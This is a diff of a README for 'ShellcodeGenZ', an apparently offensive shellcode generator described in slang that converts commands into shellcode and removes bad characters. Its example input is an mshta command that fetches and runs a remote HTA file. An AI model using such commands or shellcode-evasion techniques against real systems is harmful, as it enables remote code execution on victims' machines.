@@ -10,7 +10,7 @@ Yo, welcome to ShellcodeGenZ, the dopest shellcode generator for commands, craft
 ShellcodeGenZ takes your commands (like mshta.exe http://192.168.0.1/azi.hta) and turns 'em into shellcode that's ready to flex. It hunts down bad chars (like 0x0a, 0x0b, or the default 0x00), lets you yeet 'em manually or auto with add/subtract offsets, and logs every move so you're never lost. If 0x00 sneaks into push instructions, it's a hard pass—script's outtie. With colored output and Gen-Z slang, it's like codin' with your besties.
 
 ## Features That Slap
-- mshta Shellcode Gen: Turns mshta commands into lit shellcode.
+- Shellcode Gen: Turns commands into lit shellcode.
 - Bad Char Yeeter: Spots bad chars and lets you fix 'em manual (pick your hex) or auto (add/subtract offsets).
 - Manual Offset Drip: Choose your own offset for auto mode, or let it test 0x01 to 0xff.
 - 0x00 Check: Always yeets 0x00 and bails if it's in push instructions.
